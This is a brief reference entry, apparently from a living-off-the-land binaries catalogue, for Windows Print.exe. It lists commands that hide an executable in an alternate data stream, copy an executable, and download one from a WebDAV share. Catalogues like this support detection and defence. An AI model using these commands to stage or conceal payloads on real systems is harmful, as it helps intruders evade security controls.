## Print.exe

* Functions: Download, Copy, Add ADS

```
print /D:c:\ads\file.txt:file.exe c:\ads\file.exe     
     
print /D:C:\ads\CopyOfFile.exe C:\ads\FileToCopy.exe

print /D:c:\outfolder\outfile.exe \\webdavserver\folder\file.exe     
```
